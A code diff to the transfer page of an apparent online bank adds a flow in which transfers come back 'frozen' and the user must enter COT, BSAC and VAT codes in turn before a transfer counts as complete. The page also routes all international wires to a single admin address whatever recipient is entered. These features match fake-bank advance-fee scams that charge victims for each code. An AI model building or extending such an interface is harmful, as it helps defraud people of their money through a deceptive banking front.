@@ -23,6 +23,7 @@ export default function TransferPage() {
 
   const users = useQuery(api.users.list);
   const transfer = useMutation(api.auth.transfer);
+  const verifyTransferCode = useMutation(api.auth.verifyTransferCode);
 
   const [domesticForm, setDomesticForm] = useState({ recipientName: "", bankName: "", accountNumber: "", amount: "", description: "" });
   const [intlForm, setIntlForm] = useState({
@@ -45,6 +46,13 @@ export default function TransferPage() {
     recipientLabel: string;
   };
   const [confirmData, setConfirmData] = useState<ConfirmData | null>(null);
+
+  const [frozenTxnId, setFrozenTxnId] = useState<string | null>(null);
+  const [codeStep, setCodeStep] = useState<"cot" | "bsac" | "vat" | "completed">("cot");
+  const [codeInput, setCodeInput] = useState("");
+  const [codeLoading, setCodeLoading] = useState(false);
+  const [codeSuccess, setCodeSuccess] = useState("");
+  const [codeError, setCodeError] = useState("");
 
   useEffect(() => {
     const id = localStorage.getItem("userId");
@@ -90,10 +98,19 @@ export default function TransferPage() {
     setLoading(true);
     try {
       const desc = `Domestic transfer to ${domesticForm.recipientName} at ${domesticForm.bankName}${domesticForm.description ? ` — ${domesticForm.description}` : ""}`;
-      await transfer({ fromUserId: userId as any, toEmail: recipient!.email, amount: amt, description: desc });
-      setSuccess(`$${amt.toLocaleString()} transferred to ${domesticForm.recipientName} at ${domesticForm.bankName}`);
-      setDomesticForm({ recipientName: "", bankName: "", accountNumber: "", amount: "", description: "" });
-      setConfirmData(null);
+      const result = await transfer({ fromUserId: userId as any, toEmail: recipient!.email, amount: amt, description: desc });
+      if ((result as any)?.frozen) {
+        setFrozenTxnId((result as any).transactionId);
+        setCodeStep("cot");
+        setCodeInput("");
+        setCodeSuccess("");
+        setCodeError("");
+        setConfirmData(null);
+      } else {
+        setSuccess(`$${amt.toLocaleString()} transferred to ${domesticForm.recipientName} at ${domesticForm.bankName}`);
+        setDomesticForm({ recipientName: "", bankName: "", accountNumber: "", amount: "", description: "" });
+        setConfirmData(null);
+      }
     } catch (err: any) {
       setError(err.message || "Transfer failed");
       setConfirmData(null);
@@ -132,15 +149,24 @@ export default function TransferPage() {
     const amt = confirmData.amount;
     setLoading(true);
     try {
-      await transfer({
+      const result = await transfer({
         fromUserId: userId as any,
         toEmail: "admin@springwellbk.com",
         amount: amt,
         description: `International wire to ${intlForm.recipientName} at ${intlForm.recipientBank}${intlForm.swiftCode ? ` (SWIFT: ${intlForm.swiftCode})` : ""}${intlForm.iban ? ` (IBAN: ${intlForm.iban})` : ""}`,
       });
-      setSuccess(`International transfer of $${amt.toLocaleString()} to ${intlForm.recipientName} has been submitted. Processing takes 1-3 business days.`);
-      setIntlForm({ recipientName: "", recipientBank: "", accountNumber: "", iban: "", swiftCode: "", amount: "", currency: "USD", description: "" });
-      setConfirmData(null);
+      if ((result as any)?.frozen) {
+        setFrozenTxnId((result as any).transactionId);
+        setCodeStep("cot");
+        setCodeInput("");
+        setCodeSuccess("");
+        setCodeError("");
+        setConfirmData(null);
+      } else {
+        setSuccess(`International transfer of $${amt.toLocaleString()} to ${intlForm.recipientName} has been submitted. Processing takes 1-3 business days.`);
+        setIntlForm({ recipientName: "", recipientBank: "", accountNumber: "", iban: "", swiftCode: "", amount: "", currency: "USD", description: "" });
+        setConfirmData(null);
+      }
     } catch (err: any) {
       setError(err.message || "Transfer failed");
       setConfirmData(null);
@@ -179,20 +205,53 @@ export default function TransferPage() {
     const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
     setLoading(true);
     try {
-      await transfer({
+      const result = await transfer({
         fromUserId: userId as any,
         toEmail: recipient!.email,
         amount: amt,
         description: businessForm.description || `Business payment to ${businessForm.businessName}`,
       });
-      setSuccess(`$${amt.toLocaleString()} sent to ${businessForm.businessName}`);
-      setBusinessForm({ businessName: "", accountNumber: "", amount: "", description: "" });
-      setConfirmData(null);
+      if ((result as any)?.frozen) {
+        setFrozenTxnId((result as any).transactionId);
+        setCodeStep("cot");
+        setCodeInput("");
+        setCodeSuccess("");
+        setCodeError("");
+        setConfirmData(null);
+      } else {
+        setSuccess(`$${amt.toLocaleString()} sent to ${businessForm.businessName}`);
+        setBusinessForm({ businessName: "", accountNumber: "", amount: "", description: "" });
+        setConfirmData(null);
+      }
     } catch (err: any) {
       setError(err.message || "Transfer failed");
       setConfirmData(null);
     } finally {
       setLoading(false);
+    }
+  }
+
+  async function handleVerifyCode() {
+    if (!frozenTxnId || !codeInput.trim() || codeStep === "completed") return;
+    setCodeLoading(true);
+    setCodeError("");
+    setCodeSuccess("");
+    try {
+      const result = await verifyTransferCode({
+        transactionId: frozenTxnId as any,
+        codeType: codeStep as "cot" | "bsac" | "vat",
+        code: codeInput.trim(),
+        userId: userId as any,
+      });
+      setCodeSuccess((result as any).message);
+      setCodeInput("");
+      if (codeStep === "cot") setCodeStep("bsac");
+      else if (codeStep === "bsac") setCodeStep("vat");
+      else setCodeStep("completed");
+    } catch (err: any) {
+      setCodeError(err.message || "Invalid code");
+    } finally {
+      setCodeLoading(false);
     }
   }
 
@@ -431,6 +490,77 @@ export default function TransferPage() {
       </div>
 
       <DashboardFullFooter />
+
+      {frozenTxnId && (
+        <div className="modal-overlay" onClick={() => setFrozenTxnId(null)}>
+          <div className="modal-box" style={{ maxWidth: 420, padding: 0 }} onClick={(e) => e.stopPropagation()}>
+            <div style={{ backgroundColor: "#426FB6", padding: "16px 20px" }}>
+              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>Verify Transfer Codes</h3>
+            </div>
+            <div style={{ padding: 20 }}>
+              <p style={{ fontSize: 13, color: "#666", margin: "0 0 16px" }}>Your account is frozen. Enter the verification codes sent to your email in order.</p>
+
+              <div style={{ display: "flex", gap: 8, marginBottom: 20 }}>
+                {(["cot", "bsac", "vat"] as const).map((step, i) => (
+                  <div key={step} style={{ flex: 1, textAlign: "center" }}>
+                    <div style={{
+                      width: 32, height: 32, borderRadius: "50%", margin: "0 auto 4px",
+                      display: "flex", alignItems: "center", justifyContent: "center", fontSize: 13, fontWeight: 700,
+                      backgroundColor: codeStep === step ? "#426FB6" : (["cot", "bsac", "vat"].indexOf(codeStep) > i || (codeStep === "bsac" && step === "cot") || (codeStep === "vat" && (step === "cot" || step === "bsac"))) ? "#16a34a" : "#e5e7eb",
+                      color: codeStep === step || (["cot", "bsac", "vat"].indexOf(codeStep) > i) || (codeStep === "bsac" && step === "cot") || (codeStep === "vat" && (step === "cot" || step === "bsac")) ? "#fff" : "#999",
+                    }}>{(["cot", "bsac", "vat"].indexOf(codeStep) > i || (codeStep === "bsac" && step === "cot") || (codeStep === "vat" && (step === "cot" || step === "bsac"))) ? "✓" : i + 1}</div>
+                    <div style={{ fontSize: 11, color: "#666", textTransform: "uppercase", letterSpacing: 0.5 }}>{step}</div>
+                  </div>
+                ))}
+              </div>
+
+              {codeSuccess && (
+                <div style={{ backgroundColor: "#f0fdf4", border: "1px solid #bbf7d0", borderRadius: 6, padding: "10px 14px", marginBottom: 16, color: "#16a34a", fontSize: 13, textAlign: "center", fontWeight: 600 }}>
+                  {codeSuccess}
+                </div>
+              )}
+              {codeError && (
+                <div style={{ backgroundColor: "#fef2f2", border: "1px solid #fecaca", borderRadius: 6, padding: "10px 14px", marginBottom: 16, color: "#dc2626", fontSize: 13, textAlign: "center" }}>
+                  {codeError}
+                </div>
+              )}
+
+              {codeStep !== "completed" ? (
+                <>
+                  <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>{codeStep.toUpperCase()} Code</label>
+                  <input
+                    value={codeInput}
+                    onChange={(e) => setCodeInput(e.target.value)}
+                    placeholder={`Enter ${codeStep.toUpperCase()} code`}
+                    style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14, fontFamily: "monospace", letterSpacing: 2, textAlign: "center", boxSizing: "border-box" }}
+                    onKeyDown={(e) => { if (e.key === "Enter") handleVerifyCode(); }}
+                    autoFocus
+                  />
+                </>
+              ) : (
+                <div style={{ textAlign: "center", padding: "20px 0" }}>
+                  <div style={{ fontSize: 36, marginBottom: 8 }}>✓</div>
+                  <p style={{ fontSize: 16, fontWeight: 700, color: "#16a34a", margin: "0 0 4px" }}>Transfer Successful!</p>
+                  <p style={{ fontSize: 13, color: "#666", margin: 0 }}>All verification codes confirmed.</p>
+                </div>
+              )}
+
+              <div style={{ display: "flex", gap: 12, marginTop: 20 }}>
+                {codeStep !== "completed" && (
+                  <button onClick={() => setFrozenTxnId(null)} style={{ flex: 1, padding: "12px", border: "1px solid #ccc", borderRadius: 6, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 600 }}>Cancel</button>
+                )}
+                {codeStep !== "completed" ? (
+                  <button onClick={handleVerifyCode} disabled={codeLoading || !codeInput.trim()} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#426FB6", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700, opacity: codeLoading || !codeInput.trim() ? 0.7 : 1 }}>
+                    {codeLoading ? "Verifying..." : `Verify ${codeStep.toUpperCase()}`}
+                  </button>
+                ) : (
+                  <button onClick={() => { setFrozenTxnId(null); setCodeStep("cot"); setSuccess("Transfer completed — codes verified"); }} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#16a34a", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700 }}>Done</button>
+                )}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       {confirmData && (
         <div className="modal-overlay" onClick={() => setConfirmData(null)}>
